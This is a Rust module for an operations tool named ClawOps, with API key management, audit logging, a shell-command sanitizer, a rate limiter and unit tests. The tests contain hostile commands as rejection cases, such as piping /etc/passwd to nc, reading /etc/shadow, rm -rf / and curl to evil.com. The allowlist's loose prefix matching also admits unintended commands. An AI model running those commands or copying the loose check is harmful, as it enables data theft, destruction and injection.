//! API key management, RBAC, input validation, and rate limiting for ClawOps.
//!
//! Provides:
//! - [`ApiKeyStore`] — SHA-256 hashed secrets with expiry and rotation support
//! - [`AuditLogStore`] — append-only query log for access tracking
//! - [`InputSanitizer`] — validates hostnames, IPs, and shell commands
//! - [`RateLimiter`] — sliding-window rate limiter per provider/actor

#![forbid(unsafe_code)]

use claw_persist::JsonStore;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::Path;
use tracing::{debug, warn};

// ─────────────────────────────────────────────────────────────
// Error type
// ─────────────────────────────────────────────────────────────

/// Errors from the auth subsystem.
#[derive(Debug, thiserror::Error)]
pub enum AuthError {
    #[error("key '{0}' already exists")]
    KeyAlreadyExists(String),
    #[error("key '{0}' not found")]
    KeyNotFound(String),
    #[error("token expired at {0}")]
    TokenExpired(chrono::DateTime<chrono::Utc>),
    #[error("rate limit exceeded: {0} calls per minute")]
    RateLimitExceeded(u32),
    #[error("invalid input: {0}")]
    InvalidInput(String),
}

// ─────────────────────────────────────────────────────────────
// API Key Store
// ─────────────────────────────────────────────────────────────

/// An API key record for RBAC.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiKeyRecord {
    /// Unique key identifier.
    pub key_id: String,
    /// Human-readable name for this key.
    pub name: String,
    /// SHA-256 hash of the raw secret.
    pub secret_hash: String,
    /// Permitted scopes (e.g. `vps.*`, `config.read`).
    pub scopes: Vec<String>,
    /// RBAC role name.
    pub role: String,
    /// Whether the key is currently active.
    pub active: bool,
    /// Creation timestamp.
    pub created_at: chrono::DateTime<chrono::Utc>,
    /// Last successful use timestamp.
    pub last_used: Option<chrono::DateTime<chrono::Utc>>,
    /// Optional expiry — keys past this instant are rejected.
    pub expires_at: Option<chrono::DateTime<chrono::Utc>>,
    /// If set, this key is a rotation successor for the named key_id.
    pub rotates_key_id: Option<String>,
}

impl ApiKeyRecord {
    /// Returns `true` if this key has expired.
    pub fn is_expired(&self) -> bool {
        self.expires_at.is_some_and(|exp| exp < chrono::Utc::now())
    }

    /// Returns `true` if the key is active AND not expired.
    pub fn is_valid(&self) -> bool {
        self.active && !self.is_expired()
    }
}

/// In-memory API key store backed by JSON snapshots.
pub struct ApiKeyStore {
    keys: HashMap<String, ApiKeyRecord>,
    store: JsonStore,
}

impl ApiKeyStore {
    /// Load or create the key store at `state_path`.
    pub fn new(state_path: &Path) -> Self {
        let store = JsonStore::new(state_path, "apikeys");
        let keys = store.load();
        debug!(count = keys.len(), "loaded API keys from disk");
        Self { keys, store }
    }

    /// Create a new API key. Fails if a key with the same `key_id` already exists.
    pub fn create(&mut self, record: ApiKeyRecord) -> Result<(), AuthError> {
        if self.keys.contains_key(&record.key_id) {
            return Err(AuthError::KeyAlreadyExists(record.key_id));
        }
        let id = record.key_id.clone();
        self.keys.insert(id, record);
        self.snapshot();
        Ok(())
    }

    /// Look up a key by ID.
    pub fn get(&self, key_id: &str) -> Option<&ApiKeyRecord> {
        self.keys.get(key_id)
    }

    /// Look up a key by ID (mutable).
    pub fn get_mut(&mut self, key_id: &str) -> Option<&mut ApiKeyRecord> {
        self.keys.get_mut(key_id)
    }

    /// Find an active, non-expired key by its hashed secret.
    pub fn find_by_hash(&self, secret_hash: &str) -> Option<&ApiKeyRecord> {
        self.keys
            .values()
            .find(|k| k.secret_hash == secret_hash && k.is_valid())
    }

    /// Validate a key by hash, returning `Err` if expired or not found.
    pub fn validate_key(&self, secret_hash: &str) -> Result<&ApiKeyRecord, AuthError> {
        // First find any matching key (active or not) to distinguish not-found vs expired
        let key = self
            .keys
            .values()
            .find(|k| k.secret_hash == secret_hash && k.active);
        match key {
            None => Err(AuthError::KeyNotFound(secret_hash.to_string())),
            Some(k) if k.is_expired() => Err(AuthError::TokenExpired(k.expires_at.unwrap())),
            Some(k) => Ok(k),
        }
    }

    /// Rotate a key: create `new_record` (successor) and revoke the old key.
    ///
    /// # Errors
    /// Returns `Err` if `old_key_id` does not exist or `new_record.key_id` already exists.
    pub fn rotate(&mut self, old_key_id: &str, new_record: ApiKeyRecord) -> Result<(), AuthError> {
        if !self.keys.contains_key(old_key_id) {
            return Err(AuthError::KeyNotFound(old_key_id.to_string()));
        }
        self.create(new_record)?;
        self.revoke(old_key_id)?;
        Ok(())
    }

    /// Revoke (deactivate) a key by ID.
    pub fn revoke(&mut self, key_id: &str) -> Result<(), AuthError> {
        let key = self
            .keys
            .get_mut(key_id)
            .ok_or_else(|| AuthError::KeyNotFound(key_id.to_string()))?;
        key.active = false;
        self.snapshot();
        Ok(())
    }

    /// Permanently delete a key record.
    pub fn delete(&mut self, key_id: &str) -> Option<ApiKeyRecord> {
        let r = self.keys.remove(key_id);
        if r.is_some() {
            self.snapshot();
        }
        r
    }

    /// List all key records (active and inactive).
    pub fn list(&self) -> Vec<&ApiKeyRecord> {
        self.keys.values().collect()
    }

    /// Touch a key's `last_used` timestamp (call after successful auth).
    pub fn touch(&mut self, key_id: &str) {
        if let Some(k) = self.keys.get_mut(key_id) {
            k.last_used = Some(chrono::Utc::now());
            self.snapshot();
        }
    }

    fn snapshot(&self) {
        if let Err(e) = self.store.save(&self.keys) {
            warn!(error = %e, "failed to snapshot API key store");
        }
    }
}

// ─────────────────────────────────────────────────────────────
// Audit Log Store
// ─────────────────────────────────────────────────────────────

/// A single entry in the auth audit log.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditLogEntry {
    /// Unique entry ID.
    pub id: String,
    /// When the event occurred.
    pub timestamp: chrono::DateTime<chrono::Utc>,
    /// Actor that performed the action (agent name or key_id).
    pub actor: String,
    /// Action description (e.g. `provision`, `teardown`).
    pub action: String,
    /// Resource type affected.
    pub resource: String,
    /// Specific resource identifier.
    pub resource_id: Option<String>,
    /// Outcome (`success` or `failure`).
    pub result: String,
    /// Optional free-form details.
    pub details: Option<String>,
}

/// Queryable append-only auth audit log.
pub struct AuditLogStore {
    entries: HashMap<String, AuditLogEntry>,
    store: JsonStore,
}

impl AuditLogStore {
    /// Load or create the audit log store at `state_path`.
    pub fn new(state_path: &Path) -> Self {
        let store = JsonStore::new(state_path, "audit_log");
        let entries = store.load();
        debug!(count = entries.len(), "loaded audit log from disk");
        Self { entries, store }
    }

    /// Append a new audit entry.
    pub fn append(&mut self, entry: AuditLogEntry) {
        self.entries.insert(entry.id.clone(), entry);
        self.snapshot();
    }

    /// Query entries filtered by actor and/or action, newest-first.
    pub fn query(
        &self,
        actor: Option<&str>,
        action: Option<&str>,
        limit: usize,
    ) -> Vec<&AuditLogEntry> {
        let mut results: Vec<_> = self
            .entries
            .values()
            .filter(|e| actor.is_none_or(|a| e.actor == a))
            .filter(|e| action.is_none_or(|a| e.action == a))
            .collect();
        results.sort_by_key(|e| std::cmp::Reverse(e.timestamp));
        results.truncate(limit);
        results
    }

    /// Returns `true` if the log contains at least one entry for the given
    /// `action` on `resource_id`. Used by safety guards to require prior audit.
    pub fn has_entry_for(&self, action: &str, resource_id: &str) -> bool {
        self.entries.values().any(|e| {
            e.action == action
                && e.resource_id.as_deref() == Some(resource_id)
                && e.result == "success"
        })
    }

    fn snapshot(&self) {
        if let Err(e) = self.store.save(&self.entries) {
            warn!(error = %e, "failed to snapshot audit log");
        }
    }
}

// ─────────────────────────────────────────────────────────────
// Input Sanitizer
// ─────────────────────────────────────────────────────────────

/// Validates user-supplied strings for safe use in infrastructure operations.
///
/// All methods return `Ok(())` on success or `Err(AuthError::InvalidInput)` with
/// a description of the violation.
pub struct InputSanitizer;

impl InputSanitizer {
    /// Validate a hostname: must be non-empty, ≤ 253 chars, consist only of
    /// alphanumerics, hyphens, and dots, and not start/end with a hyphen or dot.
    pub fn validate_hostname(hostname: &str) -> Result<(), AuthError> {
        if hostname.is_empty() {
            return Err(AuthError::InvalidInput("hostname is empty".into()));
        }
        if hostname.len() > 253 {
            return Err(AuthError::InvalidInput(
                "hostname exceeds 253 characters".into(),
            ));
        }
        for label in hostname.split('.') {
            if label.is_empty() {
                return Err(AuthError::InvalidInput(
                    "hostname has empty label (consecutive dots)".into(),
                ));
            }
            if label.starts_with('-') || label.ends_with('-') {
                return Err(AuthError::InvalidInput(format!(
                    "hostname label '{label}' starts or ends with hyphen"
                )));
            }
            if !label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
                return Err(AuthError::InvalidInput(format!(
                    "hostname label '{label}' contains invalid characters"
                )));
            }
        }
        Ok(())
    }

    /// Validate an IP address (IPv4 or IPv6).
    pub fn validate_ip(ip: &str) -> Result<(), AuthError> {
        if ip.is_empty() {
            return Err(AuthError::InvalidInput("IP address is empty".into()));
        }
        ip.parse::<std::net::IpAddr>()
            .map(|_| ())
            .map_err(|_| AuthError::InvalidInput(format!("'{ip}' is not a valid IP address")))
    }

    /// Validate a command for safe SSH execution.
    ///
    /// Rejects commands containing shell metacharacters: `;`, `|`, `` ` ``,
    /// `$`, `&`, `>`, `<`, `(`, `)`, `{`, `}`, `\n`, `\r`, `\0`.
    ///
    /// Also enforces an allowlist of permitted command prefixes.
    pub fn validate_command(command: &str) -> Result<(), AuthError> {
        if command.is_empty() {
            return Err(AuthError::InvalidInput("command is empty".into()));
        }

        // Reject shell metacharacters
        const FORBIDDEN: &[char] = &[';', '|', '`', '$', '&', '>', '<', '(', ')', '{', '}'];
        for ch in FORBIDDEN {
            if command.contains(*ch) {
                return Err(AuthError::InvalidInput(format!(
                    "command contains forbidden metacharacter '{ch}'"
                )));
            }
        }
        // Reject control characters
        if command.chars().any(|c| c == '\n' || c == '\r' || c == '\0') {
            return Err(AuthError::InvalidInput(
                "command contains control characters".into(),
            ));
        }

        // Allowlist check: command must start with one of the permitted prefixes
        const ALLOWED_PREFIXES: &[&str] = &[
            "systemctl ",
            "systemctl",
            "docker ",
            "docker",
            "journalctl",
            "df ",
            "df",
            "free",
            "uptime",
            "cat /proc/",
            "ls ",
            "ls",
            "ps ",
            "ps",
            "openclaw",
            "tailscale",
            "hostname",
            "uname",
            "whoami",
            "date",
            "id",
        ];
        let trimmed = command.trim();
        if !ALLOWED_PREFIXES.iter().any(|prefix| {
            trimmed == *prefix
                || trimmed.starts_with(&format!("{prefix} "))
                || trimmed.starts_with(prefix)
        }) {
            return Err(AuthError::InvalidInput(format!(
                "command '{trimmed}' is not in the allowed command list"
            )));
        }

        Ok(())
    }
}

// ─────────────────────────────────────────────────────────────
// Rate Limiter
// ─────────────────────────────────────────────────────────────

/// Sliding-window rate limiter: max `limit` calls per 60-second window per key.
pub struct RateLimiter {
    /// Map from actor/provider key → list of call timestamps in the window.
    windows: HashMap<String, Vec<chrono::DateTime<chrono::Utc>>>,
    /// Maximum allowed calls per 60-second window.
    limit: u32,
}

impl RateLimiter {
    /// Create a rate limiter with the given per-minute call limit.
    pub fn new(limit: u32) -> Self {
        Self {
            windows: HashMap::new(),
            limit,
        }
    }

    /// Record a call for `key`. Returns `Ok(remaining)` or `Err(RateLimitExceeded)`.
    pub fn record_call(&mut self, key: &str) -> Result<u32, AuthError> {
        let now = chrono::Utc::now();
        let window_start = now - chrono::Duration::seconds(60);

        let calls = self.windows.entry(key.to_string()).or_default();
        // Evict calls outside the window
        calls.retain(|t| *t > window_start);
        calls.push(now);

        let count = calls.len() as u32;
        if count > self.limit {
            Err(AuthError::RateLimitExceeded(self.limit))
        } else {
            Ok(self.limit - count)
        }
    }

    /// Check without recording — returns remaining capacity.
    pub fn remaining(&self, key: &str) -> u32 {
        let now = chrono::Utc::now();
        let window_start = now - chrono::Duration::seconds(60);
        let count = self
            .windows
            .get(key)
            .map(|calls| calls.iter().filter(|t| **t > window_start).count() as u32)
            .unwrap_or(0);
        self.limit.saturating_sub(count)
    }
}

// ─────────────────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_api_key_store_crud() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = ApiKeyStore::new(dir.path());

        let key = ApiKeyRecord {
            key_id: "k-1".to_string(),
            name: "test-key".to_string(),
            secret_hash: "abc123hash".to_string(),
            scopes: vec!["vps.*".to_string()],
            role: "operator".to_string(),
            active: true,
            created_at: chrono::Utc::now(),
            last_used: None,
            expires_at: None,
            rotates_key_id: None,
        };
        store.create(key).expect("create");
        assert!(store.get("k-1").is_some());
        assert!(store.find_by_hash("abc123hash").is_some());

        store.revoke("k-1").expect("revoke");
        assert!(!store.get("k-1").expect("get").active);
        assert!(store.find_by_hash("abc123hash").is_none());
    }

    #[test]
    fn test_key_expiry() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = ApiKeyStore::new(dir.path());

        // Key expired 1 second ago
        let key = ApiKeyRecord {
            key_id: "k-exp".to_string(),
            name: "expired".to_string(),
            secret_hash: "exp-hash".to_string(),
            scopes: vec![],
            role: "operator".to_string(),
            active: true,
            created_at: chrono::Utc::now(),
            last_used: None,
            expires_at: Some(chrono::Utc::now() - chrono::Duration::seconds(1)),
            rotates_key_id: None,
        };
        store.create(key).expect("create");
        assert!(
            store.find_by_hash("exp-hash").is_none(),
            "expired key should not be found"
        );
        assert!(
            matches!(
                store.validate_key("exp-hash"),
                Err(AuthError::TokenExpired(_))
            ),
            "should return TokenExpired"
        );
    }

    #[test]
    fn test_key_rotation() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = ApiKeyStore::new(dir.path());

        let old_key = ApiKeyRecord {
            key_id: "k-old".to_string(),
            name: "old".to_string(),
            secret_hash: "old-hash".to_string(),
            scopes: vec![],
            role: "operator".to_string(),
            active: true,
            created_at: chrono::Utc::now(),
            last_used: None,
            expires_at: None,
            rotates_key_id: None,
        };
        store.create(old_key).expect("create old");

        let new_key = ApiKeyRecord {
            key_id: "k-new".to_string(),
            name: "new".to_string(),
            secret_hash: "new-hash".to_string(),
            scopes: vec![],
            role: "operator".to_string(),
            active: true,
            created_at: chrono::Utc::now(),
            last_used: None,
            expires_at: None,
            rotates_key_id: Some("k-old".to_string()),
        };
        store.rotate("k-old", new_key).expect("rotate");

        assert!(
            !store.get("k-old").expect("old exists").active,
            "old key must be revoked"
        );
        assert!(
            store.find_by_hash("new-hash").is_some(),
            "new key must be active"
        );
    }

    #[test]
    fn test_audit_log_store() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut store = AuditLogStore::new(dir.path());

        store.append(AuditLogEntry {
            id: "a-1".to_string(),
            timestamp: chrono::Utc::now(),
            actor: "commander".to_string(),
            action: "provision".to_string(),
            resource: "instance".to_string(),
            resource_id: Some("i-abc".to_string()),
            result: "success".to_string(),
            details: None,
        });

        let all = store.query(None, None, 10);
        assert_eq!(all.len(), 1);
        assert!(store.has_entry_for("provision", "i-abc"));
        assert!(!store.has_entry_for("teardown", "i-abc"));
    }

    // ─── InputSanitizer tests ─────────────────────────────────────────────────

    #[test]
    fn test_validate_hostname_valid() {
        assert!(InputSanitizer::validate_hostname("example.com").is_ok());
        assert!(InputSanitizer::validate_hostname("my-host-01").is_ok());
        assert!(InputSanitizer::validate_hostname("node1.eu.clawops.io").is_ok());
    }

    #[test]
    fn test_validate_hostname_invalid() {
        assert!(InputSanitizer::validate_hostname("").is_err());
        assert!(InputSanitizer::validate_hostname("-bad.com").is_err());
        assert!(InputSanitizer::validate_hostname("bad-.com").is_err());
        assert!(InputSanitizer::validate_hostname("bad..com").is_err());
        assert!(InputSanitizer::validate_hostname("bad_host").is_err());
    }

    #[test]
    fn test_validate_ip_valid() {
        assert!(InputSanitizer::validate_ip("192.168.1.1").is_ok());
        assert!(InputSanitizer::validate_ip("10.0.0.1").is_ok());
        assert!(InputSanitizer::validate_ip("::1").is_ok());
        assert!(InputSanitizer::validate_ip("2001:db8::1").is_ok());
    }

    #[test]
    fn test_validate_ip_invalid() {
        assert!(InputSanitizer::validate_ip("").is_err());
        assert!(InputSanitizer::validate_ip("999.999.999.999").is_err());
        assert!(InputSanitizer::validate_ip("not-an-ip").is_err());
    }

    #[test]
    fn test_validate_command_valid() {
        assert!(InputSanitizer::validate_command("docker ps").is_ok());
        assert!(InputSanitizer::validate_command("systemctl status openclaw").is_ok());
        assert!(InputSanitizer::validate_command("df -h").is_ok());
        assert!(InputSanitizer::validate_command("uptime").is_ok());
    }

    #[test]
    fn test_validate_command_rejects_metacharacters() {
        assert!(InputSanitizer::validate_command("docker ps; rm -rf /").is_err());
        assert!(InputSanitizer::validate_command("cat /etc/passwd | nc 1.2.3.4 9999").is_err());
        assert!(InputSanitizer::validate_command("`whoami`").is_err());
        assert!(InputSanitizer::validate_command("$(cat /etc/shadow)").is_err());
        assert!(InputSanitizer::validate_command("cmd && evil").is_err());
    }

    #[test]
    fn test_validate_command_rejects_not_in_allowlist() {
        assert!(InputSanitizer::validate_command("rm -rf /").is_err());
        assert!(InputSanitizer::validate_command("curl http://evil.com").is_err());
        assert!(InputSanitizer::validate_command("python3 exploit.py").is_err());
    }

    #[test]
    fn test_validate_command_rejects_control_characters() {
        assert!(InputSanitizer::validate_command("docker ps\nrm -rf /").is_err());
        assert!(InputSanitizer::validate_command("uptime\0").is_err());
    }

    // ─── RateLimiter tests ────────────────────────────────────────────────────

    #[test]
    fn test_rate_limiter_allows_within_limit() {
        let mut rl = RateLimiter::new(5);
        for _ in 0..5 {
            assert!(rl.record_call("hetzner").is_ok());
        }
    }

    #[test]
    fn test_rate_limiter_rejects_over_limit() {
        let mut rl = RateLimiter::new(3);
        for _ in 0..3 {
            rl.record_call("vultr").unwrap();
        }
        assert!(
            matches!(
                rl.record_call("vultr"),
                Err(AuthError::RateLimitExceeded(3))
            ),
            "4th call should be rate-limited"
        );
    }

    #[test]
    fn test_rate_limiter_separate_keys() {
        let mut rl = RateLimiter::new(2);
        rl.record_call("hetzner").unwrap();
        rl.record_call("hetzner").unwrap();
        // hetzner is full, but vultr is fresh
        assert!(rl.record_call("vultr").is_ok());
        assert!(rl.record_call("hetzner").is_err());
    }
}
